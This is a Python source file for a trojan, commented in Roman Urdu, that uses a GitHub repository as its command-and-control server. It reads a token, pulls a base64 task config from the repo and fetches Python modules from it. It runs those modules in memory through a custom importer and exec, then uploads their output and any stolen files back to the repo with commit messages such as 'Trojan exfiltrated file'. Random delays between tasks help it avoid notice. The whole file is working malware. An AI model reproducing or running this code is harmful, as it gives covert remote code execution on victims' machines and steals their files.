import base64
import github3
import importlib
import importlib.util
import importlib.machinery
import json
import random
import sys
import time
from datetime import datetime

def github_connect():
    try:
        with open('mytoken.txt', 'r') as f:
            token = f.read().strip()
    except FileNotFoundError:
        print("[-] Error: 'mytoken.txt' file nahi mili!")
        sys.exit()

    username = 'Uzair1179'
    repository = 'Trojan'
    
    session = github3.login(token=token)
    return session.repository(username, repository)

def get_file_contents(dirname, module_name, repo):
    try:
        file_path = f"{dirname}/{module_name}"
        file_content = repo.file_contents(file_path)
        return file_content.content
    except Exception as e:
        return None

def get_trojan_config(repo):
    config_json = get_file_contents('config', 'abc.json', repo)
    if config_json is not None:
        try:
            decoded_content = base64.b64decode(config_json).decode('utf-8')
            return json.loads(decoded_content)
        except Exception as parse_err:
            return []
    return []

# 🟢 BULLET-PROOF UPLOAD: Yeh asli file ko uske original format mein bhejega
def store_module_result(module_name, data, repo):
    timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
    
    # Check karna ke kya data aik dictionary hai (yaani asli file download hui hai)
    if isinstance(data, dict) and "bytes" in data:
        original_name = data["filename"]
        # File ko asli naam aur unique timestamp ke sath save karna (e.g., Data/20261010-Sikandar.pdf)
        remote_path = f"Data/{timestamp}-{original_name}"
        raw_bytes = data["bytes"]
        
        print(f"[*] Asli File original format mein upload ho rahi hai: {remote_path}")
        repo.create_file(
            path=remote_path,
            message=f"Trojan exfiltrated file: {original_name}",
            content=raw_bytes  # Direct raw bytes upload ho rahe hain
        )
    else:
        # Agar aam text data hai (jaise list), to purane tarike se text file banayega
        remote_path = f"Data/{module_name}-{timestamp}.txt"
        data_str = str(data)
        print(f"[*] Text report upload ho raha hai: {remote_path}")
        repo.create_file(
            path=remote_path,
            message=f"Trojan report for {module_name}",
            content=data_str.encode('utf-8')
        )
    print("[+] Operation successful! Data delivered cleanly.")

class GitImporter:
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, name, path=None):
        print(f"[*] GitHub se module dhoonda ja raha hai: {name}")
        self.repo = github_connect()
        new_library = get_file_contents('modules', f'{name}.py', self.repo)
        
        if new_library is not None:
            self.current_module_code = base64.b64decode(new_library).decode('utf-8')
            return self
        return None

    def load_module(self, name):
        new_module = sys.modules.setdefault(name, importlib.util.module_from_spec(
            importlib.machinery.ModuleSpec(name, loader=self)
        ))
        new_module.__file__ = f"github://{name}"
        new_module.__loader__ = self
        exec(self.current_module_code, new_module.__dict__)
        return new_module

if __name__ == '__main__':
    print("[*] Trojan Automated Engine chalu ho raha hai...")
    sys.meta_path.insert(0, GitImporter())
    
    repo = github_connect()
    config = get_trojan_config(repo)
    print(f"[+] GitHub se instructions mil gayin: {config}")
    
    for task in config:
        module_name = task['module']
        try:
            importer = GitImporter()
            loader = importer.find_module(module_name)
            if loader:
                module = loader.load_module(module_name)
                print(f"[+] {module_name} RAM mein load ho gaya. Running...")
                result = module.run(**task)
                store_module_result(module_name, result, repo)
            else:
                print(f"[-] GitHub par '{module_name}.py' nahi mil saki.")
        except Exception as e:
            print(f"[-] {module_name} chalane mein masla aaya: {e}")
        
        time.sleep(random.randint(2, 5))
